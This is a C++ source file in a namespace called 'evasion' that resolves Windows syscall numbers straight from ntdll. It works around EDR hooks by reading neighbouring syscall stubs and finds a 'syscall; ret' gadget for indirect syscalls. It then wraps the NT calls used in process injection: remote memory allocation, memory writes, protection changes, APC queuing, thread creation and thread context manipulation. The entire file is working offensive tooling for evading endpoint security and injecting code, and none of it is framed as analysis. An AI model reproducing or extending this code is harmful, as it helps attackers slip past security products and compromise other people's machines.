#include "Syscalls.h"
#include <algorithm>

namespace evasion {

SyscallResolver& SyscallResolver::GetInstance() {
    static SyscallResolver instance;
    return instance;
}

SyscallResolver::SyscallResolver() {
    ResolveAll();
}

void SyscallResolver::ResolveAll() {
    // Get ntdll base address from PEB
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHeader->e_lfanew);
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + exportDirRVA);

    PDWORD namePtr = (PDWORD)((BYTE*)hNtdll + exportDir->AddressOfNames);
    PDWORD addrPtr = (PDWORD)((BYTE*)hNtdll + exportDir->AddressOfFunctions);
    PWORD ordPtr = (PWORD)((BYTE*)hNtdll + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hNtdll + namePtr[i]);
        if (name[0] == 'Z' && name[1] == 'w') { // Zw functions share SSNs with Nt
            // Logic to find SSN
            PBYTE funcAddr = (PBYTE)hNtdll + addrPtr[ordPtr[i]];
            
            DWORD ssn = 0;
            bool found = false;

            // Search for: mov eax, SSN (0xB8)
            for (int offset = 0; offset < 32; offset++) {
                if (funcAddr[offset] == 0xB8) { // mov eax, imm32
                    ssn = *(DWORD*)&funcAddr[offset + 1];
                    found = true;
                    break;
                }
                
                if (funcAddr[offset] == 0xE9) { // jmp (EDR hook)
                    for (int idx = 1; idx < 10; idx++) {
                        PBYTE neighborUpper = funcAddr - (idx * 32); 
                        if (neighborUpper[3] == 0xB8) {
                            ssn = (*(DWORD*)&neighborUpper[4]) + idx;
                            found = true;
                            break;
                        }
                        PBYTE neighborLower = funcAddr + (idx * 32);
                        if (neighborLower[3] == 0xB8) {
                            ssn = (*(DWORD*)&neighborLower[4]) - idx;
                            found = true;
                            break;
                        }
                    }
                }
                if (found) break;
            }

            if (found) {
                std::string ntName = name;
                ntName[0] = 'N'; ntName[1] = 't';
                m_syscallMap[ntName] = ssn;
                
                // Robustly find a syscall; ret gadget
                if (!m_syscallGadget) {
                    // Try looking in the current function first
                    for (int g = 0; g < 64; g++) {
                        if (funcAddr[g] == 0x0F && funcAddr[g+1] == 0x05 && funcAddr[g+2] == 0xC3) {
                            m_syscallGadget = (PVOID)(funcAddr + g);
                            break;
                        }
                    }
                }
            }
        }
    }

    // Fallback: If no gadget found in functions, scan ntdll text section for 'syscall; ret'
    if (!m_syscallGadget) {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (strcmp((char*)section[i].Name, ".text") == 0) {
                PBYTE start = (PBYTE)hNtdll + section[i].VirtualAddress;
                DWORD size = section[i].Misc.VirtualSize;
                for (DWORD j = 0; j < size - 2; j++) {
                    if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3) {
                        m_syscallGadget = (PVOID)(start + j);
                        break;
                    }
                }
            }
            if (m_syscallGadget) break;
        }
    }
}

DWORD SyscallResolver::GetServiceNumber(const std::string& functionName) {
    if (m_syscallMap.count(functionName)) {
        return m_syscallMap[functionName];
    }
    return 0xFFFFFFFF;
}

PVOID SyscallResolver::GetSyscallGadget() {
    return m_syscallGadget;
}

NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtAllocateVirtualMemory");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)ZeroBits, (UINT_PTR)RegionSize, (UINT_PTR)AllocationType, (UINT_PTR)Protect, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtWriteVirtualMemory");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)Buffer, (UINT_PTR)NumberOfBytesToWrite, (UINT_PTR)NumberOfBytesWritten, 0, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtProtectVirtualMemory");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)RegionSize, (UINT_PTR)NewProtect, (UINT_PTR)OldProtect, 0, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtQueueApcThreadEx(HANDLE ThreadHandle, HANDLE UserApcReserveHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtQueueApcThreadEx");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)UserApcReserveHandle, (UINT_PTR)ApcRoutine, (UINT_PTR)ApcArgument1, (UINT_PTR)ApcArgument2, (UINT_PTR)ApcArgument3, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtResumeThread");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)SuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtSuspendThread");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)PreviousSuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtGetContextThread");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)ThreadContext, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtCreateThreadEx");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)DesiredAccess, (UINT_PTR)ObjectAttributes, (UINT_PTR)ProcessHandle, (UINT_PTR)StartRoutine, (UINT_PTR)Argument, (UINT_PTR)CreateFlags, (UINT_PTR)ZeroBits, (UINT_PTR)StackSize, (UINT_PTR)MaximumStackSize, (UINT_PTR)AttributeList);
}

NTSTATUS SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtSetContextThread");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)ThreadContext, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtWaitForSingleObject");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)Handle, (UINT_PTR)Alertable, (UINT_PTR)Timeout, 0, 0, 0, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtFreeVirtualMemory");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)RegionSize, (UINT_PTR)FreeType, 0, 0, 0, 0, 0, 0, 0);
}

NTSTATUS SysNtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtWriteFile");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)FileHandle, (UINT_PTR)Event, (UINT_PTR)ApcRoutine, (UINT_PTR)ApcContext, (UINT_PTR)IoStatusBlock, (UINT_PTR)Buffer, (UINT_PTR)Length, (UINT_PTR)ByteOffset, (UINT_PTR)Key, 0, 0);
}

NTSTATUS SysNtClose(HANDLE Handle) {
    auto& res = SyscallResolver::GetInstance();
    DWORD ssn = res.GetServiceNumber("NtClose");
    PVOID gadget = res.GetSyscallGadget();
    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
    return InternalDoSyscall(ssn, gadget, (UINT_PTR)Handle, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

} // namespace evasion
